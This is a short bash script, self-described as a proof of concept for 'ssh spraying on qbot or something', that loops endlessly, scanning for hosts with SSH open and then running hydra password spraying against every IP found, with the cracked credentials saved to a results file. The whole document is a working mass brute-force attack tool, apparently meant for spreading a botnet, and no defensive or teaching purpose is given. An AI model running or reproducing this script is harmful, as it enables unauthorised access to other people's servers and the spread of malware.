#PoC for ssh spraying on qbot or something
while true; do
    python3 emap-ssh.py 22 120 ips.txt 4

    while read -r ip; do
        [ -z "$ip" ] && continue   # skip empty lines

        echo "[*] Attacking $ip"
        #if you can get ncrack to work itd be a lot better
        #ncrack -vv -U users.txt -P passwords.txt $ip:22 -oA "output_$ip"
        hydra -L users.txt -P passwords.txt ssh://$ip -t 4 -f -o results.txt -I

    done < ips.txt

    rm -f ips.txt
    sleep 10
done
